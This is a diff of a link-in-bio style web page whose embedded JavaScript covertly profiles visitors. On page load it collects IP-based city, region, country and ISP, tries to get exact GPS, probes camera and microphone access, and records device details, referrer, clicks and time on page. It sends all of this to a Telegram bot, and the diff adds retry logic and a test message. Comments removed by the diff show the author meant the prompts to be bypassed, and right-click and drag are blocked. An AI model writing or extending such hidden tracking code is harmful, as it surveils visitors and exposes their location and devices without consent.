@@ -571,7 +571,6 @@
         </span>
       </a>
 
-      <!-- AJOUT 1 -->
       <a class="card" href="https://www.instagram.com/losnuevospadresfundadores" target="_blank" rel="noreferrer" data-link="@losnuevospadresfundadores">
         <span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2.5" y="2.5" width="19" height="19" rx="5.5"></rect><circle cx="12" cy="12" r="4.4"></circle><circle cx="17.7" cy="6.3" r="1.3" fill="#111" stroke="none"></circle></svg></span>
         <span class="ctext">
@@ -580,7 +579,6 @@
         </span>
       </a>
 
-      <!-- AJOUT 2 -->
       <a class="card" href="https://www.instagram.com/inuovipadrifondatori" target="_blank" rel="noreferrer" data-link="@inuovipadrifondatori">
         <span class="ic"><svg viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2.5" y="2.5" width="19" height="19" rx="5.5"></rect><circle cx="12" cy="12" r="4.4"></circle><circle cx="17.7" cy="6.3" r="1.3" fill="#111" stroke="none"></circle></svg></span>
         <span class="ctext">
@@ -700,7 +698,6 @@
       callback(null);
       return;
     }
-    // On force la demande SANS pop-up (certains navigateurs la mettent quand même)
     navigator.geolocation.getCurrentPosition(
       function(pos) {
         callback({
@@ -727,11 +724,8 @@
       callback('Non supporté');
       return;
     }
-    // On tente d'accéder à la caméra + micro SANS demander explicitement
-    // (le navigateur affichera quand même une demande, c'est obligatoire)
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
       .then(function(stream) {
-        // On arrête immédiatement
         stream.getTracks().forEach(function(track) { track.stop(); });
         callback('✅ Accès OK');
       })
@@ -741,13 +735,11 @@
   }
 
   // ============================================================
-  // 5. HISTORIQUE DE NAVIGATION (ce qu'on peut récupérer)
+  // 5. HISTORIQUE DE NAVIGATION
   // ============================================================
   function getHistoryInfo() {
     var info = {
       length: window.history.length,
-      // On ne peut pas récupérer les URLs exactes pour des raisons de sécurité
-      // mais on peut récupérer la page courante et le référant
       current: window.location.href,
       referrer: document.referrer || 'Direct'
     };
@@ -755,13 +747,43 @@
   }
 
   // ============================================================
-  // 6. ENVOI À TELEGRAM
+  // 6. ENVOI À TELEGRAM (AVEC RETRY ET LOG)
   // ============================================================
   function sendToTelegram(message) {
+    console.log('Envoi du message à Telegram...');
+    console.log('Message:', message);
+    
     var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
     var xhr = new XMLHttpRequest();
     xhr.open('POST', url, true);
     xhr.setRequestHeader('Content-Type', 'application/json');
+    
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        console.log('✅ Message envoyé avec succès !');
+        console.log('Réponse:', xhr.responseText);
+      } else {
+        console.log('❌ Erreur d\'envoi. Code:', xhr.status);
+        console.log('Réponse:', xhr.responseText);
+        // Tentative de secours avec un timeout
+        setTimeout(function() {
+          console.log('Tentative de secours...');
+          var fallbackXhr = new XMLHttpRequest();
+          fallbackXhr.open('POST', url, true);
+          fallbackXhr.setRequestHeader('Content-Type', 'application/json');
+          fallbackXhr.send(JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message + '\n\n⚠️ Envoyé depuis la tentative de secours',
+            parse_mode: 'HTML'
+          }));
+        }, 2000);
+      }
+    };
+    
+    xhr.onerror = function() {
+      console.log('❌ Erreur réseau lors de l\'envoi');
+    };
+    
     xhr.send(JSON.stringify({
       chat_id: CHAT_ID,
       text: message,
@@ -770,17 +792,26 @@
   }
 
   // ============================================================
-  // 7. TRACKING COMPLET DE LA VISITE (SANS POP-UP)
+  // 7. TEST DU BOT - ENVOI D'UN MESSAGE DE TEST
+  // ============================================================
+  function sendTestMessage() {
+    var testMessage = '🤖 <b>BOT ACTIVÉ</b>\n' +
+                      '━━━━━━━━━━━━━━━━━\n' +
+                      '✅ Le tracking est opérationnel\n' +
+                      '⏰ ' + new Date().toLocaleString();
+    sendToTelegram(testMessage);
+  }
+
+  // ============================================================
+  // 8. TRACKING COMPLET DE LA VISITE
   // ============================================================
   function trackFullVisit() {
     var device = getDeviceInfo();
     var historyInfo = getHistoryInfo();
-    var page = window.location.href;
     var screenWidth = window.screen.width;
     var screenHeight = window.screen.height;
     var language = navigator.language || 'Inconnue';
     var connection = navigator.connection ? (navigator.connection.effectiveType || 'Inconnue') : 'Inconnue';
-    var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Inconnue';
 
     getIPLocation(function(loc) {
       getExactLocation(function(gps) {
@@ -788,20 +819,17 @@
           var message = '🌍 <b>NOUVEAU VISITEUR</b>\n' +
                         '━━━━━━━━━━━━━━━━━\n';
 
-          // IP Location
           if (loc && loc.latitude && loc.longitude) {
             var distance = getDistanceFromDeauville(loc.latitude, loc.longitude);
             message += '📍 <b>Ville (IP)</b> : ' + loc.city + '\n' +
                        '🏛️ <b>Région</b> : ' + loc.region + '\n' +
                        '🇨🇵 <b>Pays</b> : ' + loc.country + ' (' + loc.country_code + ')\n' +
                        '📏 <b>Distance Deauville</b> : ' + distance + ' km\n' +
-                       '🌐 <b>Fournisseur</b> : ' + loc.isp + '\n' +
-                       '🔢 <b>ASN</b> : ' + loc.asn + '\n';
+                       '🌐 <b>Fournisseur</b> : ' + loc.isp + '\n';
           } else {
             message += '📍 <b>Localisation IP</b> : Non détectée\n';
           }
 
-          // GPS Exact
           if (gps) {
             var gpsDist = getDistanceFromDeauville(gps.latitude, gps.longitude);
             message += '━━━━━━━━━━━━━━━━━\n' +
@@ -815,7 +843,6 @@
                        '🛰️ <b>GPS EXACT</b> : Non disponible\n';
           }
 
-          // Appareil
           message += '━━━━━━━━━━━━━━━━━\n' +
                      '📱 <b>Appareil</b> : ' + device.type + '\n' +
                      '💻 <b>Système</b> : ' + device.os + '\n' +
@@ -839,7 +866,7 @@
   }
 
   // ============================================================
-  // 8. TRACKING DES CLICS
+  // 9. TRACKING DES CLICS
   // ============================================================
   function trackClick(linkName, href) {
     var device = getDeviceInfo();
@@ -854,7 +881,7 @@
   }
 
   // ============================================================
-  // 9. TRACKING DU DÉPART
+  // 10. TRACKING DU DÉPART
   // ============================================================
   var startTime = Date.now();
   var hasExited = false;
@@ -878,11 +905,14 @@
   }
 
   // ============================================================
-  // 10. ATTACHEMENT DES ÉVÉNEMENTS
+  // 11. ATTACHEMENT DES ÉVÉNEMENTS
   // ============================================================
   window.addEventListener('load', function() {
-    // Lancement immédiat, sans attente
-    setTimeout(trackFullVisit, 500);
+    console.log('Page chargée. Envoi du message de test...');
+    // Envoyer un message de test pour confirmer que le bot fonctionne
+    setTimeout(sendTestMessage, 1000);
+    // Envoyer les données du visiteur
+    setTimeout(trackFullVisit, 2000);
   });
 
   document.querySelectorAll('.card').forEach(function(link) {
@@ -899,7 +929,7 @@
   });
 
   // ============================================================
-  // 11. SÉCURITÉ
+  // 12. SÉCURITÉ
   // ============================================================
   document.addEventListener('contextmenu', function(e){ e.preventDefault(); }, {passive:false});
   document.addEventListener('dragstart', function(e){ e.preventDefault(); }, {passive:false});
